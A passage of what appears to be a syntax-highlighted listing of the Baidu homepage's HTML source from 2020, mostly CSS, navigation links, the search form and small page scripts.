0;vertical-align:top;*vertical-align:middle&#125;#head_wrapper .s_form&#123;width:642px;height:100%;min-height:293px;margin:0 auto 0 auto;text-align:left;z-index:100&#125;#head_wrapper .s-p-top&#123;height:61.8%;min-height:181px;position:relative;z-index:0;text-align:center&#125;#head_wrapper.s-down&#123;position:fixed;_position:static;top:0;left:50%;height:50px;min-height:50px;z-index:20;width:802px;padding-top:9px;margin-left:-447px;_margin:0 auto&#125;#head_wrapper.s-down .s_form_wrapper&#123;width:805px&#125;#head_wrapper.s-down .s_form&#123;min-width:550px;margin:0;width:100%;height:100%;padding-left:0;margin-top:0;min-height:0&#125;#head_wrapper.s-down .s-p-top&#123;display:none&#125;#head_wrapper.s-down #result_logo,#head_wrapper.s-down .fm&#123;display:inline-block;*display:inline;zoom:1;vertical-align:middle&#125;@-webkit-keyframes fadein&#123;from&#123;opacity:0&#125;to&#123;opacity:1&#125;&#125;#head_wrapper.s-down #result_logo&#123;-webkit-animation:fadein 1s&#125;#head_wrapper.s-down .fm&#123;margin:8px 0 0 25px&#125;#head_wrapper.s-down #result_logo img&#123;width:101px&#125;#head_wrapper.s-down .btn,.s-title-img .btn&#123;cursor:pointer;width:104px;height:40px;line-height:38px;padding:0;background:0 0;background-color:#38f;font-size:16px;color:#fff;box-shadow:none;font-weight:400;border:1px solid #38f;border-bottom:1px solid #2e7ae5&#125;#head_wrapper.s-down .btn.btnhover,#head_wrapper.s-down .btn:hover,.s-title-img .btn.btnhover,.s-title-img .btn:hover&#123;height:40px;_height:38px;background-color:#317ef3;border-bottom:1px solid #2868c8;*border-bottom:none;box-shadow:1px 1px 1px #ccc&#125;.s-skin-hasbg .btn&#123;width:104px;height:40px;line-height:40px;line-height:37px\9;padding:0;border:0;background-position:-464px -42px;cursor:pointer;color:#000;font-size:16px&#125;.s-title-img .nobg_btn_bg:hover&#123;padding:0;background-color:#2e85ff;border:1px solid #2e85ff;color:#fff&#125;.s-title-img .s-skin-hasbg .nobg_btn_bg:hover&#123;padding:0;background-color:#fff;border:0;color:#fff&#125;.s-skin-hasbg .s-title-img .btn:hover&#123;border-bottom:none;box-shadow:1px 1px 3px rgba(0,0,0,.2);height:40px&#125;#head_wrapper.s-down .btn_h,.btn_h&#123;padding:0;background-color:#2a7beb;color:#fff;outline:0&#125;.s-skin-hasbg .s-title-img .btn_h&#123;background-position:-136px -43px;background-color:#e6e6e6&#125;.s_btn_wr_h&#123;border-left:1px solid #2875df;border-right:1px solid #2875df;border-top:1px solid #2469c8&#125;#head_wrapper.s-down #kw,.s_form_login #kw&#123;width:521px;height:20px;padding:9px 7px;font:16px arial;border:1px solid #b8b8b8;border-bottom:1px solid #ccc;border-right:0;vertical-align:top;outline:0;box-shadow:none&#125;.s_form_login #kw&#123;margin:0&#125;.s-title-img .nobg_s_fm_focus&#123;border-top:1px solid #38f!important;border-left:1px solid #38f!important;border-bottom:1px solid #38f!important&#125;.nobg_s_fm_hover&#123;border-top:1px solid #999!important;border-left:1px solid #999!important;border-bottom:1px solid #b3b3b3!important&#125;.s-skin-hasbg .s-title-img .nobg_s_fm_focus&#123;border:0!important&#125;.s-skin-hasbg .nobg_s_fm_hover&#123;border:0!important&#125;.s-skin-hasbg .btn_wr&#123;background-position:-287px -41px;width:104px;height:40px;border:0&#125;#head_wrapper.s-down .s_btn_wr,.s_btn_wr&#123;width:104px;height:40px&#125;.s-skin-hasbg #head_wrapper.s-down .s_ipt:focus&#123;border-top:1px solid #38f!important;border-left:1px solid #38f!important;border-bottom:1px solid #38f!important&#125;.s-skin-hasbg .btn_wr&#123;background:0 0&#125;.s-skin-hasbg #kw&#123;padding:10px 9px 10px 7px;border:0;background-image:none;height:20px;line-height:20px;box-shadow:0 1px 3px rgba(0,0,0,.2);-webkit-box-shadow:0 1px 3px rgba(0,0,0,.2);-moz-box-shadow:0 1px 3px rgba(0,0,0,.2)&#125;.s-skin-hasbg .btn&#123;box-shadow:1px 1px 3px rgba(0,0,0,.2);-webkit-box-shadow:1px 1px 3px rgba(0,0,0,.2);-moz-box-shadow:1px 1px 3px rgba(0,0,0,.2)&#125;.s-skin-hasbg .btn_h&#123;box-shadow:0 0 5px rgba(0,0,0,.35);-webkit-box-shadow:0 0 5px rgba(0,0,0,.35);-moz-box-shadow:0 0 5px rgba(0,0,0,.35)&#125;.s-skin-hasbg .btn,.s-skin-hasbg .btn_wr&#123;background-image:url(http://ss.bdimg.com/static/superman/img/skin_dark-48fa9dbf5c.png)&#125;.s-skin-hasbg .btn&#123;background-position:-206px 0&#125;.s_form_nologin .s_btn_wr&#123;display:inline-block;background-position:-120px -48px;*position:relative;z-index:0;vertical-align:top;width:auto;height:auto;border-bottom:1px solid transparent;*border-bottom:none&#125;.s_form_nologin .s_btn&#123;width:100px;height:36px;padding-top:2px\9;cursor:pointer;color:#fff;font-size:15px;letter-spacing:1px;background:#3385ff;border-bottom:1px solid #2d78f4;outline:medium;*border-bottom:none;-webkit-appearance:none;-webkit-border-radius:0&#125;.s_form_nologin .s_btn.btnhover&#123;background:#317ef3;border-bottom:1px solid #2868c8;*border-bottom:none;box-shadow:1px 1px 1px #ccc&#125;.s_form_nologin .s_btn_h&#123;background:#3075dc;box-shadow:inset 1px 1px 5px #2964bb;-webkit-box-shadow:inset 1px 1px 5px #2964bb;-moz-box-shadow:inset 1px 1px 5px #2964bb;-o-box-shadow:inset 1px 1px 5px #2964bb&#125;.s_form_nologin .s_ipt_wr&#123;height:34px;border:1px solid #b6b6b6;background:#fff;display:inline-block;vertical-align:top;width:539px;margin-right:0;border-right-width:0;border-color:#b8b8b8 transparent #ccc #b8b8b8;overflow:hidden&#125;.s_form_nologin .s_ipt_wr.ipthover,.s_form_nologin .s_ipt_wr:hover&#123;border-color:#999 transparent #b3b3b3 #999&#125;.s_form_nologin .s_ipt_wr.iptfocus&#123;border-color:#4791ff transparent #4791ff #4791ff&#125;.s_form_nologin .s_ipt_tip&#123;color:#aaa;position:absolute;z-index:-10;font:16px/22px arial;height:32px;line-height:32px;padding-left:7px;overflow:hidden;width:526px&#125;.s_form_nologin .s_ipt&#123;width:526px;height:22px;font:16px/18px arial;line-height:22px;margin:6px 0 0 7px;padding:0;background:0 0;border:0;outline:0;-webkit-appearance:none&#125;&lt;/style&gt;&lt;style type="text/css" index="qrcode"&gt;#qrcodeCon&#123;text-align:center;position:absolute;bottom:132px;width:100%&#125;#qrcodeCon.hide&#123;display:none&#125;#qrcodeCon #qrcode&#123;display:inline-block;*float:left;*margin-top:4px&#125;#qrcodeCon #qrcode .qrcode-item&#123;float:left&#125;#qrcodeCon #qrcode .qrcode-item-2&#123;margin-left:33px&#125;#qrcodeCon #qrcode .qrcode-img&#123;width:106px;height:106px;margin:0 auto;padding:5px;border:1px solid #f3f3f3&#125;#qrcodeCon #qrcode .qrcode-item-1 .qrcode-img&#123;background:url(http://ss.bdimg.com/static/superman/img/qrcode/zbios-09b6296ee6.png) 0 0 no-repeat;background-position:5px 5px&#125;#qrcodeCon #qrcode .qrcode-item-2 .qrcode-img&#123;background:url(http://ss.bdimg.com/static/superman/img/qrcode/nuomi-365eabd8b7.png) 0 0 no-repeat;background-position:5px 5px&#125;@media only screen and (-webkit-min-device-pixel-ratio:2)&#123;#qrcodeCon #qrcode .qrcode-item-1 .qrcode-img&#123;background-image:url(http://ss.bdimg.com/static/superman/img/qrcode/zbios_x2-5869f49078.png);background-size:106px 106px&#125;#qrcodeCon #qrcode .qrcode-item-2 .qrcode-img&#123;background-image:url(http://ss.bdimg.com/static/superman/img/qrcode/nuomi_x2-55dc5b734e.png);background-size:106px 106px&#125;&#125;#qrcodeCon #qrcode .qrcode-text&#123;color:#999;line-height:23px&#125;#qrcodeCon #qrcode .qrcode-text a&#123;color:#999;text-decoration:none&#125;#qrcodeCon #qrcode .qrcode-text p&#123;text-align:center&#125;#qrcodeCon #qrcode .qrcode-text b&#123;color:#666;font-weight:700&#125;#qrcodeCon #qrcode .qrcode-text span&#123;letter-spacing:1px&#125;#qrcodeCon #qrcode .qrcode-text .title&#123;color:#333;font-size:16px;line-height:32px;letter-spacing:3px&#125;#qrcodeCon #qrcode .qrcode-text .sub-title&#123;color:#999;font-size:14px;line-height:14px;font-weight:300&#125;&lt;/style&gt;</span></span><br><span class="line">&lt;style&gt;</span><br><span class="line"><span class="comment">#u1 a.mnav.sp,#u1 a.mnav.sp:visited&#123;color:#F23F40;position: relative;&#125;</span></span><br><span class="line"><span class="comment">#u1 a.mnav.sp.dot::before&#123;content:' ';position: absolute;width:6px;height: 6px;background-color: #F23F40;border-radius: 50%;top: 3px;right: -6px;&#125;</span></span><br><span class="line">&lt;/style&gt;&lt;!--[if lte IE 8]&gt;&lt;style index="index" data-compress="strip"&gt;.s_form&#123;top:260px&#125;&lt;/style&gt;&lt;![endif]--&gt;&lt;!--[if IE 8]&gt;&lt;style index="index" data-compress="strip"&gt;<span class="comment">#u1 a.mnav,#u1 a.mnav:visited,#u1 a.lb,#u1 a.lb:visited,#u1 a.pf,#u1 a.pf:visited,#u1 a.bri,#u1 a.bri:visited&#123;font-family:simsun;&#125;&lt;/style&gt;&lt;![endif]--&gt;&lt;style data-for="debug"&gt;#debug&#123;display:none!important;&#125;&lt;/style&gt;</span></span><br><span class="line">&lt;style data-for="result" id="css_index_result" type="text/css"&gt;<span class="comment">#seth&#123;display:inline;behavior:url(#default#homepage)&#125;</span></span><br><span class="line"><span class="comment">#setf&#123;display:inline&#125;</span></span><br><span class="line"><span class="comment">#sekj&#123;margin-left:14px&#125;</span></span><br><span class="line"><span class="comment">#sekj,#st&#123;display:none&#125;</span></span><br><span class="line">.wrapper_s .s_ipt_wr&#123;width:439px&#125;</span><br><span class="line">.wrapper_s .s_ipt&#123;width:434px&#125;</span><br><span class="line">.wrapper_s .s_ipt_tip&#123;width:434px&#125;</span><br><span class="line"><span class="comment">#kw&#123;position:relative&#125;</span></span><br><span class="line"><span class="comment">#u .username i&#123;background-position:-408px -144px&#125;</span></span><br><span class="line">.bdpfmenu,.usermenu&#123;border:1px solid <span class="comment">#d1d1d1;position:absolute;width:105px;top:36px;z-index:302;box-shadow:1px 1px 5px #d1d1d1;-webkit-box-shadow:1px 1px 5px #d1d1d1;-moz-box-shadow:1px 1px 5px #d1d1d1;-o-box-shadow:1px 1px 5px #d1d1d1&#125;</span></span><br><span class="line">.bdpfmenu&#123;font-size:12px;background-color:<span class="comment">#fff&#125;</span></span><br><span class="line">.bdpfmenu a,.usermenu a&#123;display:block;text-align:left;margin:0!important;padding:0 9px;line-height:26px;text-decoration:none&#125;</span><br><span class="line">.briiconsbg&#123;background-repeat:no-repeat;background-size:300px 18px;background-image:url(https://ss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/static/protocol/https/home/img/icons_0c37e9b.png);background-image:url(https://ss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/static/protocol/https/home/img/icons_809ae65.gif)\9&#125;</span><br><span class="line"><span class="comment">#u&#123;z-index:301;position:absolute;right:0;top:0;margin:21px 9px 5px 0;padding:0&#125;</span></span><br><span class="line">.wrapper_s <span class="comment">#u&#123;margin-right:3px&#125;</span></span><br><span class="line"><span class="comment">#u a&#123;text-decoration:underline;color:#333;margin:0 7px&#125;</span></span><br><span class="line">.wrapper_s <span class="comment">#u a&#123;margin-right:0 6px&#125;</span></span><br><span class="line"><span class="comment">#u div a&#123;text-decoration:none&#125;</span></span><br><span class="line"><span class="comment">#u a:hover&#123;text-decoration:underline&#125;</span></span><br><span class="line"><span class="comment">#u .back_org&#123;color:#666;float:left;display:inline-block;height:24px;line-height:24px&#125;</span></span><br><span class="line"><span class="comment">#u .bri&#123;display:inline-block;width:24px;height:24px;float:left;line-height:24px;color:transparent;background:url(https://ss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/static/protocol/https/home/img/icons_0c37e9b.png) no-repeat 4px 3px;background-size:300px 18px;background-image:url(https://ss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/static/protocol/https/home/img/icons_809ae65.gif)\9;overflow:hidden&#125;</span></span><br><span class="line"><span class="comment">#u .bri.brihover,#u .bri:hover&#123;background-position:-18px 3px&#125;</span></span><br><span class="line"><span class="comment">#mCon #imeSIcon&#123;background-position:-408px -144px;margin-left:0&#125;</span></span><br><span class="line"><span class="comment">#mCon span&#123;color:#333&#125;</span></span><br><span class="line"><span class="comment">#u .usermenu a:link,#u .usermenu a:visited,.bdpfmenu a:link,.bdpfmenu a:visited&#123;background:#fff;color:#333&#125;</span></span><br><span class="line"><span class="comment">#u .usermenu a:active,#u .usermenu a:hover,.bdpfmenu a:active,.bdpfmenu a:hover&#123;background:#38f;text-decoration:none;color:#fff&#125;</span></span><br><span class="line">.bdpfmenu&#123;width:70px&#125;</span><br><span class="line">.usermenu&#123;width:68px;right:8px&#125;</span><br><span class="line"><span class="comment">#wrapper .bdnuarrow&#123;width:0;height:0;font-size:0;line-height:0;display:block;position:absolute;top:-10px;left:50%;margin-left:-5px&#125;</span></span><br><span class="line"><span class="comment">#wrapper .bdnuarrow em,#wrapper .bdnuarrow i&#123;width:0;height:0;font-size:0;line-height:0;display:block;position:absolute;border:5px solid transparent;border-style:dashed dashed solid&#125;</span></span><br><span class="line"><span class="comment">#wrapper .bdnuarrow em&#123;border-bottom-color:#d8d8d8;top:-1px&#125;</span></span><br><span class="line"><span class="comment">#wrapper .bdnuarrow i&#123;border-bottom-color:#fff;top:0&#125;</span></span><br><span class="line"><span class="comment">#prefpanel&#123;background:#fafafa;display:none;opacity:0;position:fixed;_position:absolute;top:-359px;z-index:500;width:100%;min-width:960px;border-bottom:1px solid #ebebeb&#125;</span></span><br><span class="line"><span class="comment">#prefpanel form&#123;_width:850px&#125;</span></span><br><span class="line"><span class="comment">#kw_tip&#123;cursor:default;display:none;margin-top:1px&#125;</span></span><br><span class="line"><span class="comment">#bds-message-wrapper&#123;top:43px&#125;</span></span><br><span class="line">.quickdelete-wrap&#123;position:relative&#125;</span><br><span class="line">.quickdelete-wrap input&#123;width:500px&#125;</span><br><span class="line">.wrapper_l .quickdelete-wrap input&#123;width:500px&#125;</span><br><span class="line">.wrapper_s .quickdelete-wrap input&#123;width:402px&#125;</span><br><span class="line">input::-ms-clear&#123;<span class="attribute">display</span>:none&#125;</span><br><span class="line"><span class="variable">.quickdelete</span>&#123;width:32px;<span class="attribute">height</span>:32px;<span class="attribute">background</span>:url(https://ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>/5eN1bjq8AAUYm2zgoY3K/r/www/cache/static/protocol/https/global/img/quickdelete_33e3eb8<span class="variable">.png</span>) no-repeat;<span class="attribute">background-position</span>:10px 10px;<span class="attribute">position</span>:absolute;<span class="attribute">display</span>:block&#125;</span><br><span class="line"><span class="variable">.quickdelete</span>:hover&#123;background-position:10px -24px&#125;</span><br><span class="line">#lh a&#123;margin-left:25px&#125;</span><br><span class="line"><span class="variable">.bdbriwrapper-tuiguang</span>&#123;display:none!important&#125;&lt;/style&gt;&lt;!--[if IE 8]&gt;&lt;style index="index" data-compress="strip"&gt;<span class="variable">.s_ipt</span>&#123;background-color:#FFF;&#125;&lt;/style&gt;&lt;![endif]--&gt;</span><br><span class="line">    &lt;script data-compress=strip&gt;</span><br><span class="line">        function h(obj)&#123;</span><br><span class="line">            obj.style.behavior='url(<span class="comment">#default#homepage)';</span></span><br><span class="line">            var a = obj.setHomePage('//www.baidu.com/');</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        _manCard = &#123;</span><br><span class="line">            asynJs : [],</span><br><span class="line">            asynLoad : function(id)&#123;</span><br><span class="line">                _manCard.asynJs.push(id);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        window._sp_async = 1;</span><br><span class="line"></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">                                &lt;noscript&gt;</span><br><span class="line">                &lt;meta http-equiv=refresh content="0; url=/baidu.html?from=noscript"&gt;</span><br><span class="line">            &lt;/noscript&gt;</span><br><span class="line">            </span><br><span class="line">&lt;noscript&gt;&lt;meta http-equiv="refresh" content="0; url=http://www.baidu.com/baidu.html?from=noscript" /&gt;&lt;/noscript&gt;&lt;/head&gt;&lt;body class=""&gt;</span><br><span class="line">    </span><br><span class="line">&lt;script&gt;</span><br><span class="line">    if (/Chrome\/37.0.2062.94/i.test(navigator.userAgent) &amp;&amp; (/(windows 7)|(windows nt 6.1)/i.test(navigator.userAgent))) &#123;</span><br><span class="line">        var _chrome_37_fix = document.createElement("style");</span><br><span class="line">        _chrome_37_fix.type="text/css";</span><br><span class="line">        _chrome_37_fix.setAttribute("data-for","result");</span><br><span class="line">        _chrome_37_fix.innerHTML = ".t,.f16,<span class="comment">#kw,.s_ipt,.c-title,.c-title-size,.to_zhidao,.to_tieba,.to_zhidao_bottom&#123;font-size:15px;&#125; .ec-hospital-info-main h2,.ad-widget-gx_sck-ylzx-doctor-info h2,.ec-card-main h2,.ad-widget-h1 h2,.ad-widget-title h2,.ad-widget-small-head h2,.ad-widget-small-head h2 a,.ad-widget-header .ec-figcaption h2&#123;font-size: 15px !important;&#125;";</span></span><br><span class="line">        document.getElementsByTagName("head")[0].appendChild(_chrome_37_fix);</span><br><span class="line">    &#125;</span><br><span class="line">    else if (navigator.userAgent.indexOf('Edge') &gt; -1) &#123;</span><br><span class="line">        var body = document.querySelector('body');</span><br><span class="line">        body.className += ' browser-edge';</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div id="wrapper"&gt;&lt;script&gt;if(window.bds&amp;&amp;bds.util&amp;&amp;bds.util.setContainerWidth)&#123;bds.util.setContainerWidth();&#125;&lt;/script&gt;&lt;div id="head"&gt;</span><br><span class="line">&lt;div id="s_top_wrap" class="s-top-wrap"&gt;&lt;div class="s-top-nav"&gt;&lt;/div&gt;&lt;div class="s-center-box"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="u"&gt;&lt;a class="toindex" href="/"&gt;百度首页&lt;/a&gt;&lt;a href="javascript:;" name="tj_settingicon" class="pf"&gt;设置&lt;i class="c-icon c-icon-triangle-down"&gt;&lt;/i&gt;&lt;/a&gt;&lt;a href="https://passport.baidu.com/v2/?login&amp;tpl=mn&amp;u=http%3A%2F%2Fwww.baidu.com%2F&amp;sms=5" name="tj_login" class="lb" onclick="return false;"&gt;登录&lt;/a&gt;&lt;/div&gt;&lt;div id="u1"&gt;&lt;a href="https://voice.baidu.com/act/newpneumonia/newpneumonia/?from=osari_pc_1" target="_blank" id="virus-2020" class="mnav sp"&gt;抗击肺炎&lt;/a&gt;&lt;a href="http://news.baidu.com" name="tj_trnews" class="mnav"&gt;新闻&lt;/a&gt;&lt;a href="https://www.hao123.com" name="tj_trhao123" class="mnav"&gt;hao123&lt;/a&gt;&lt;a href="http://map.baidu.com" name="tj_trmap" class="mnav"&gt;地图&lt;/a&gt;&lt;a href="http://v.baidu.com" name="tj_trvideo" class="mnav"&gt;视频&lt;/a&gt;&lt;a href="http://tieba.baidu.com" name="tj_trtieba" class="mnav"&gt;贴吧&lt;/a&gt;&lt;a href="http://xueshu.baidu.com" name="tj_trxueshu" class="mnav"&gt;学术&lt;/a&gt;&lt;a href="https://passport.baidu.com/v2/?login&amp;tpl=mn&amp;u=http%3A%2F%2Fwww.baidu.com%2F&amp;sms=5" name="tj_login" class="lb" onclick="return false;"&gt;登录&lt;/a&gt;&lt;a href="http://www.baidu.com/gaoji/preferences.html" name="tj_settingicon" class="pf"&gt;设置&lt;/a&gt;&lt;a href="http://www.baidu.com/more/" name="tj_briicon" class="bri" style="display: block;"&gt;更多产品&lt;/a&gt;&lt;/div&gt;&lt;div id="head_wrapper" class="head_wrapper s-isindex-wrap"&gt;&lt;div class="s_form s_form_nologin"&gt;&lt;div class="s_form_wrapper"&gt;&lt;style&gt;.index-logo-srcnew &#123;display: none;&#125;@media (-webkit-min-device-pixel-ratio: 2),(min--moz-device-pixel-ratio: 2),(-o-min-device-pixel-ratio: 2),(min-device-pixel-ratio: 2)&#123;.index-logo-src &#123;display: none;&#125;.index-logo-srcnew &#123;display: inline;&#125;&#125;&lt;/style&gt;&lt;div id="lg" class="s-p-top"&gt;&lt;img hidefocus="true" class='index-logo-src' src="//www.baidu.com/img/bd_logo1.png" width="270" height="129" onerror="this.src='//www.baidu.com/img/bd_logo1.png';this.onerror=null;" usemap="<span class="comment">#mp"&gt;&lt;img hidefocus="true" class='index-logo-srcnew' src="//www.baidu.com/img/bd_logo1.png?qua=high" width="270" height="129" onerror="this.src='//www.baidu.com/img/bd_logo1.png';this.onerror=null;" usemap="#mp"&gt;&lt;map name="mp"&gt;&lt;area style="outline:none;" hidefocus="true" shape="rect" coords="0,0,270,129" href="//www.baidu.com/s?wd=%E4%BB%8A%E6%97%A5%E6%96%B0%E9%B2%9C%E4%BA%8B&amp;tn=SE_PclogoS_8whnvm25&amp;sa=ire_dl_gh_logo&amp;rsv_dl=igh_logo_pcs" onmousedown="return ns_c(&#123;fm: 'tab', tab: 'felogo', rsv_platform: 'wwwhome' &#125;)" target="_blank" title="点击一下，了解更多"onmousedown="return ns_c(&#123;'fm':'behs','tab':'bdlogo'&#125;)"&gt;&lt;/map&gt;&lt;/div&gt;&lt;a href="/" id="result_logo" onmousedown="return c(&#123;'fm':'tab','tab':'logo'&#125;)"&gt;&lt;img class='index-logo-src' src="//www.baidu.com/img/baidu_jgylogo3.gif" alt="到百度首页" title="到百度首页"&gt;&lt;img class='index-logo-srcnew' src="//www.baidu.com/img/baidu_resultlogo@2.png" alt="到百度首页" title="到百度首页"&gt;&lt;/a&gt;&lt;form id="form" name="f" action="/s" class="fm"&gt;&lt;input type="hidden" name="ie" value="utf-8"&gt;&lt;input type="hidden" name="f" value="8"&gt;&lt;input type="hidden" name="rsv_bp" value="1"&gt;&lt;input type="hidden" name="rsv_idx" value="1"&gt;&lt;input type=hidden name=ch value=""&gt;&lt;input type=hidden name=tn value="baidu"&gt;&lt;input type=hidden name=bar value=""&gt;&lt;span class="bg s_ipt_wr"&gt;&lt;input id="kw" name="wd" class="s_ipt" value="" maxlength="255" autocomplete="off"&gt;&lt;/span&gt;&lt;span class="bg s_btn_wr"&gt;&lt;input type="submit" id="su" value="百度一下" class="bg s_btn"&gt;&lt;/span&gt;&lt;span class="tools"&gt;&lt;span id="mHolder"&gt;&lt;div id="mCon"&gt;&lt;span&gt;输入法&lt;/span&gt;&lt;/div&gt;&lt;ul id="mMenu"&gt;&lt;li&gt;&lt;a href="javascript:;" name="ime_hw"&gt;手写&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="javascript:;" name="ime_py"&gt;拼音&lt;/a&gt;&lt;/li&gt;&lt;li class="ln"&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="javascript:;" name="ime_cl"&gt;关闭&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/span&gt;&lt;/span&gt;&lt;input type="hidden" name="rn" value=""&gt;&lt;input type="hidden" name="oq" value=""&gt;&lt;input type="hidden" name="rsv_pq" value=""&gt;&lt;input type="hidden" name="rsv_t" value="e358ZG0z1srwJDl/Ygz8oT3CELKA1f6hl3YzBaGVY61Mo6/Mu8j5P2CJuN0"&gt;&lt;input type="hidden" name="rqlang" value=""&gt;&lt;/form&gt;&lt;div id="m"&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line">    &lt;div id="s_wrap" class="s-isindex-wrap"&gt;&lt;div id="s_main" class="main clearfix"&gt;&lt;/div&gt;&lt;/div&gt;</span><br><span class="line">    </span><br><span class="line">	&lt;div id="bottom_layer" class="s-bottom-layer"&gt;&lt;div class="s-bottom-layer-left"&gt;&lt;p class="lh"&gt;&lt;a href="//www.baidu.com/cache/sethelp/index.html" target="_blank"&gt;设为首页&lt;/a&gt;&lt;/p&gt;&lt;p class="lh"&gt;&lt;a href="//home.baidu.com" target="_blank"&gt;关于百度&lt;/a&gt;&lt;/p&gt;&lt;p class="lh"&gt;&lt;a href="http://ir.baidu.com" target="_blank"&gt;About Baidu&lt;/a&gt;&lt;/p&gt;&lt;p class="lh"&gt;&lt;a href="http://e.baidu.com/?refer=888" target="_blank"&gt;百度推广&lt;/a&gt;&lt;/p&gt;&lt;p class="lh"&gt;&lt;a href="//www.baidu.com/duty" target="_blank"&gt;使用百度前必读&lt;/a&gt;&lt;/p&gt;&lt;p class="lh"&gt;&lt;a href="//help.baidu.com/newadd?prod_id=1&amp;category=4" target="_blank"&gt;意见反馈&lt;/a&gt;&lt;/p&gt;&lt;p class="lh"&gt;&lt;a href="//help.baidu.com" target="_blank"&gt;帮助中心&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;div id="s-bottom-layer-right" class="s-bottom-layer-right"&gt;&lt;span class="lh"&gt;&amp;<span class="comment">#169;2020&amp;nbsp;Baidu&amp;nbsp;&lt;/span&gt;&lt;span class="lh"&gt;(京)-经营性-2017-0020&lt;/span&gt;&lt;a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11000002000001"  target="_blank"&gt;&lt;span class="lh s-bottom-recordcode"&gt;京公网安备11000002000001号&lt;/span&gt;&lt;/a&gt;&lt;span class="lh"&gt;京ICP证030173号&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line">&lt;div class="s_tab" id="s_tab"&gt;&lt;div class="s_tab_inner"&gt;&lt;b&gt;网页&lt;/b&gt;&lt;a href="//www.baidu.com/s?rtt=1&amp;bsst=1&amp;cl=2&amp;tn=news&amp;word=" wdfield="word"  onmousedown="return c(&#123;'fm':'tab','tab':'news'&#125;)" sync="true"&gt;资讯&lt;/a&gt;&lt;a href="http://tieba.baidu.com/f?kw=&amp;fr=wwwt" wdfield="kw"  onmousedown="return c(&#123;'fm':'tab','tab':'tieba'&#125;)"&gt;贴吧&lt;/a&gt;&lt;a href="http://zhidao.baidu.com/q?ct=17&amp;pn=0&amp;tn=ikaslist&amp;rn=10&amp;word=&amp;fr=wwwt" wdfield="word"  onmousedown="return c(&#123;'fm':'tab','tab':'zhidao'&#125;)"&gt;知道&lt;/a&gt;&lt;a href="http://music.taihe.com/search?fr=ps&amp;ie=utf-8&amp;key=" wdfield="key"  onmousedown="return c(&#123;'fm':'tab','tab':'music'&#125;)"&gt;音乐&lt;/a&gt;&lt;a href="http://image.baidu.com/search/index?tn=baiduimage&amp;ps=1&amp;ct=201326592&amp;lm=-1&amp;cl=2&amp;nc=1&amp;ie=utf-8&amp;word=" wdfield="word"  onmousedown="return c(&#123;'fm':'tab','tab':'pic'&#125;)"&gt;图片&lt;/a&gt;&lt;a href="http://v.baidu.com/v?ct=301989888&amp;rn=20&amp;pn=0&amp;db=0&amp;s=25&amp;ie=utf-8&amp;word=" wdfield="word"   onmousedown="return c(&#123;'fm':'tab','tab':'video'&#125;)"&gt;视频&lt;/a&gt;&lt;a href="http://map.baidu.com/m?word=&amp;fr=ps01000" wdfield="word"  onmousedown="return c(&#123;'fm':'tab','tab':'map'&#125;)"&gt;地图&lt;/a&gt;&lt;a href="http://wenku.baidu.com/search?word=&amp;lm=0&amp;od=0&amp;ie=utf-8" wdfield="word"  onmousedown="return c(&#123;'fm':'tab','tab':'wenku'&#125;)"&gt;文库&lt;/a&gt;&lt;a href="//www.baidu.com/more/"  onmousedown="return c(&#123;'fm':'tab','tab':'more'&#125;)"&gt;更多»&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id="qrcodeCon" class="qrcodeCon "&gt;&lt;div id="qrcode"&gt;&lt;div class="qrcode-item qrcode-item-1"&gt;&lt;div class="qrcode-img"&gt;&lt;/div&gt;&lt;div class="qrcode-text"&gt;&lt;p class="title"&gt;下载百度APP&lt;/p&gt;&lt;p class="sub-title"&gt;有事搜一搜&amp;nbsp;&amp;nbsp;没事看一看&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="wrapper_wrapper"&gt;&lt;/div&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class="c-tips-container" id="c-tips-container"&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        window.__async_strategy=2;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    var bds=&#123;</span><br><span class="line">        se:&#123;&#125;,</span><br><span class="line">        su:&#123;</span><br><span class="line">            urdata:[],</span><br><span class="line">                        urSendClick:function()&#123;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        util:&#123;&#125;,</span><br><span class="line">        use:&#123;&#125;,</span><br><span class="line">        comm : &#123;</span><br><span class="line">            domain:"http:\/\/www.baidu.com",</span><br><span class="line">            ubsurl : "http:\/\/sclick.baidu.com\/w.gif",</span><br><span class="line">            tn:"baidu",</span><br><span class="line">            queryEnc:"",</span><br><span class="line">            queryId:"",</span><br><span class="line">            inter:"",</span><br><span class="line">            templateName:"",</span><br><span class="line">            sugHost : "http:\/\/suggestion.baidu.com\/su",</span><br><span class="line">            query : "",</span><br><span class="line">            dpquery: "",</span><br><span class="line">            qid : "",</span><br><span class="line">            cid : "",</span><br><span class="line">            sid : "30968_1427_21084_30997_30824_30717",</span><br><span class="line">            indexSid : "30968_1427_21084_30997_30824_30717",</span><br><span class="line">            sampleval : [],</span><br><span class="line">            stoken : "",</span><br><span class="line">            serverTime : "1584083776",</span><br><span class="line">            user : "",</span><br><span class="line">            username : "",</span><br><span class="line">            userid : "",</span><br><span class="line">            loginAction : [],</span><br><span class="line">            useFavo : 